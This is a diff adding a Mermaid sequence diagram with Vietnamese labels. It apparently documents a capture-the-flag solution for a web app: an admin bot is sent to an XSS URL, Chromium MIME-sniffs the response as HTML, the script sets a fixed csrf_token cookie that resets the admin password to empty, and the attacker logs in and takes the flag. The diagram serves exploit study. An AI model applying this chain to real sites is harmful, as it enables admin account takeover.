@@ -1,0 +1,26 @@
+sequenceDiagram
+    autonumber
+    actor Attacker
+    participant App as "Web App"
+    participant Bot as "Admin Bot / Chromium"
+
+    Attacker->>App: Đăng ký và đăng nhập user thường
+    Attacker->>App: POST /immortal-gate/report<br/>URL = /immortal-gate/check?name=[payload XSS]
+    App-->>Attacker: Đã gửi URL cho admin bot
+
+    Bot->>App: GET /immortal-gate/sign-in
+    Bot->>App: POST /immortal-gate/sign-in<br/>username=admin, password=ADMIN_PASSWORD
+    App-->>Bot: Set session admin + csrf_token thật
+
+    Bot->>App: GET /immortal-gate/check?name=[payload XSS]
+    App-->>Bot: Response thiếu Content-Type, chứa payload HTML/JS
+    Note over Bot: Chromium MIME-sniff response thành HTML<br/>và thực thi script trong origin của app
+
+    Bot->>Bot: document.cookie = 'csrf_token=123； path=/cultivation/password'
+    Bot->>App: GET /cultivation/password<br/>Cookie csrf_token=123<br/>Header x-csrf-token: 123
+    App-->>Bot: Đổi password admin thành chuỗi rỗng
+
+    Attacker->>App: POST /immortal-gate/sign-in<br/>username=admin, password=
+    App-->>Attacker: Set session admin
+    Attacker->>App: POST /immortal-gate/treasure
+    App-->>Attacker: Trả flag
